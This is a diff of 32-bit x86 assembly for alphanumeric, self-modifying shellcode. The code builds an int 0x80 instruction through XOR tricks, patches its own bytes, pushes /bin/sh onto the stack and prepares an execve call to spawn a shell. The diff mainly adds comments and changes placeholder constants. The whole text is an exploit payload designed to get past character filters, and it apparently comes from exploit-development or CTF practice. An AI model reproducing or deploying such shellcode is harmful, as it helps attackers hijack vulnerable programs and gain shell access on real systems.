@@ -3,18 +3,21 @@ bits 32
 codelen equ inject-$
 
 start_listing:
+
+; Store initial instruction pointer
     push eax ; push the eip, which is incidentally stored in eax
     pop edx
 
-    push '____'
+; Construct a 0x80 for interrupt
+    ; Clear eax and ecx
+    push 'xxxx'
     pop eax
-    xor eax, '____'
-    push eax
+    xor eax, 'xxxx'
 
-    push eax
-    pop ecx
+    ;push eax
+    ;pop ecx
 
-    ; construct a 0x80 for interrupt
+    ; Create 0x80 in eax
     xor al, 0x7A ; Starting with highest ascii symbol (z)
     push eax ; Move eax to ecx to allow increment
     pop ecx
@@ -40,9 +43,9 @@ start_listing:
     xor [edx+codelen+1], cl
 
     ; Create 8 nul bytes on the stack
-    push '____'
+    push 'xxxx'
     pop eax
-    xor eax, '____'
+    xor eax, 'xxxx'
 
     push eax
     push eax
@@ -53,9 +56,9 @@ start_listing:
 
 
     ; Push \0 to the stack
-    push '____'
+    push 'xxxx'
     pop eax
-    xor eax, '____'
+    xor eax, 'xxxx'
     
 
     ; Push /bin/sh to the stack
@@ -95,10 +98,9 @@ start_listing:
     popad
 
     ;mov eax, SYS_execve
-    push '____'
+    push 'xxxx'
     pop eax
-    xor eax,'____'
-    ;xor al, `\t`
+    xor eax,'xxxx'
     ;xor al, SYS_execve
     xor al, 'O' ; O  = 01001111
     xor al, 'D' ; D  = 01000100
